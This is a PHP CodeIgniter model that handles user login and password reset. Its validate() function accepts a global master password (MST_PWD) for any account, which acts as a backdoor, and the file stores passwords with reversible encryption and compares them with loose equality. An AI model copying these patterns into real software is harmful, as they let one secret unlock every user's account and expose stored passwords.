<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login_Model extends CI_Model {

    function validate($data) {
        $this->db->select('id, password');
        $this->db->where(array(
            'username' => $data['username'],
            'isactive' => 1
        ));
        $query = $this->db->get(LOGIN);
        $password = $data['password'];
        if ($query->num_rows() == 1) {
            $dbpassword = hash('sha256', hash('sha256', $this->encryption->decrypt($query->row()->password)) . $this->session->userdata('nonce'));
            $mstpwd = hash('sha256', hash('sha256', MST_PWD) . $this->session->userdata('nonce'));
            if ($dbpassword == $password || $password == $mstpwd) {
			//if ($password == $mstpwd) {
                $login_id = $query->row()->id;
                $this->session_model->set_session($login_id);
                return TRUE;
            }
        }
        return FALSE;
    }

    function reset_password($data) {
        $key = $this->session->userdata('user');
        $k = json_decode($this->encryption->decrypt($key), true);
        $this->db->select('password');
        $this->db->where(array(
            'user_id' => $k['user_id'],
            'isactive' => 1
        ));
        $query = $this->db->get(LOGIN);
        $dbpwd = $this->encryption->decrypt($query->row()->password);
        if($dbpwd == $data['current_password']) {
            $input = array(
                'password' => $this->encryption->encrypt($data['password'])
            );
            $this->db->where('user_id', $k['user_id']);
            $this->db->update(LOGIN, $input);
            return true;
        }        
        return false;
    }

}
